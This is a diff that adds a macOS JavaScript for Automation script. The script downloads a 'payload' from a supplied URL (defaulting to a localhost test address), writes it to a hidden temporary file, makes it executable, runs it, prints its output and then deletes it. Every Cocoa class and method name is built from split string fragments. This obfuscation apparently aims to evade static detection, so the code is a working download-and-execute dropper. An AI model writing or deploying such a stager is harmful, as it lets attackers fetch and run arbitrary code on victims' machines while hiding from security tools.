@@ -1,0 +1,89 @@
+function joinParts(parts) {
+    return parts.join("");
+}
+
+ObjC.import(joinParts(["Co", "coa"]));
+
+const URLClass = $[joinParts(["NS", "URL"])];
+const requestClass = $[joinParts(["NS", "Mutable", "URL", "Request"])];
+const connectionClass = $[joinParts(["NS", "URL", "Connection"])];
+const uuidClass = $[joinParts(["NS", "UUID"])];
+const fileManagerClass = $[joinParts(["NS", "File", "Manager"])];
+const dictionaryClass = $[joinParts(["NS", "Mutable", "Dictionary"])];
+const numberClass = $[joinParts(["NS", "Number"])];
+const taskClass = $[joinParts(["NS", "Task"])];
+const pipeClass = $[joinParts(["NS", "Pipe"])];
+const stringClass = $[joinParts(["NS", "String"])];
+
+function fail(message) {
+    throw new Error(message);
+}
+
+function run(argv) {
+const payloadURL = argv.length ? argv[0] :
+    joinParts(["ht", "tp", "://", "127.0.", "0.1", ":8080", "/test"]);
+const url = URLClass[joinParts(["URL", "With", "String"])](payloadURL);
+if (!url) fail(joinParts(["invalid ", "payload ", "URL"]));
+
+// Foundation keeps transfer and staging operations in-process.
+const request = requestClass[joinParts(["request", "With", "URL"])](url);
+request[joinParts(["set", "Timeout", "Interval"])](12);
+request[joinParts(["set", "Cache", "Policy"])](
+    $[joinParts(["NS", "URLRequest", "ReloadIgnoring", "LocalCacheData"])]);
+const response = Ref();
+const requestError = Ref();
+const payload = connectionClass[joinParts([
+    "send", "Synchronous", "Request", "Returning", "Response", "Error"
+])](request, response, requestError);
+if (!payload || payload.length === 0)
+    fail(joinParts(["download", " failed"]));
+
+const temporaryDirectory = ObjC.unwrap(
+    $[joinParts(["NS", "Temporary", "Directory"])]());
+const temporaryName = "." + ObjC.unwrap(
+    uuidClass[joinParts(["UUID"])]
+             [joinParts(["UUID", "String"])]);
+const payloadPath = temporaryDirectory + temporaryName;
+const fileManager = fileManagerClass[joinParts(["default", "Manager"])];
+
+try {
+    if (!payload[joinParts(["write", "To", "File", "Atomically"])](
+            payloadPath, true))
+        fail(joinParts(["write", " failed"]));
+
+    const attributes = dictionaryClass[joinParts(["dictionary"])];
+    attributes[joinParts(["set", "Object", "For", "Key"])](
+        numberClass[joinParts(["number", "With", "Unsigned", "Long"])](448),
+        $[joinParts(["NS", "File", "Posix", "Permissions"])]);
+    const attributeError = Ref();
+    if (!fileManager[joinParts([
+            "set", "Attributes", "Of", "Item", "At", "Path", "Error"
+        ])](attributes, payloadPath, attributeError))
+        fail(joinParts(["permission", " update", " failed"]));
+
+    const task = taskClass[joinParts(["alloc"])][joinParts(["init"])];
+    const output = pipeClass[joinParts(["pipe"])];
+    task[joinParts(["launch", "Path"])] = payloadPath;
+    task[joinParts(["arguments"])] = [];
+    task[joinParts(["standard", "Output"])] = output;
+    task[joinParts(["standard", "Error"])] = output;
+    const launchError = Ref();
+    if (!task[joinParts(["launch", "And", "Return", "Error"])](launchError))
+        fail(joinParts(["launch", " failed"]));
+
+    const outputData = output[joinParts(["file", "Handle", "For", "Reading"])]
+        [joinParts(["read", "Data", "To", "End", "Of", "File"])];
+    task[joinParts(["wait", "Until", "Exit"])];
+    const outputText = stringClass[joinParts(["alloc"])]
+        [joinParts(["init", "With", "Data", "Encoding"])](
+            outputData, $[joinParts(["NS", "UTF8", "String", "Encoding"])]);
+    if (outputText) console.log(ObjC.unwrap(outputText));
+    if (task[joinParts(["termination", "Status"])] !== 0)
+        fail(joinParts(["payload", " exited", " with", " status "]) +
+             task[joinParts(["termination", "Status"])]);
+} finally {
+    const removeError = Ref();
+    fileManager[joinParts(["remove", "Item", "At", "Path", "Error"])](
+        payloadPath, removeError);
+}
+}
